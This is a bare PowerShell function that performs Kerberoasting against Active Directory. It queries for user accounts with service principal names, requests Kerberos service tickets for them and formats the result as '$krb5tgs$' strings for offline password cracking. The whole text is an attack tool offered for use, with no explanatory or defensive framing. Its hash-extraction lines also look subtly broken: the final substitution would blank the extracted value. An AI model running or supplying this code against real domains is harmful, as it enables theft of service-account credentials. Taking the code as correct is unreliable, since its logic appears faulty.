function Get-Kerberoast {
${q}=[adsisearcher]"(&(objectClass=user)(servicePrincipalName=*)(samAccountType=805306368))";
${q}.PropertiesToLoad.AddRange(@('samaccountname','serviceprincipalname'))|Out-Null;
${q}.FindAll()|%{${n}=$_.Properties.samaccountname[0];if(${n}-ne'krbtgt'){${s}=$_.Properties.serviceprincipalname[0];
try{${t}=New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken(${s});
${hx}=[BitConverter]::ToString(${t}.GetRequest())-replace'-';
${h}=${hx}-replace'A382....3082....A0030201....A1........A282....','';
${h}=$h.Substring(0,68)-replace'..','';
"`$krb5tgs`$${s}:$h"}catch{}}}
}
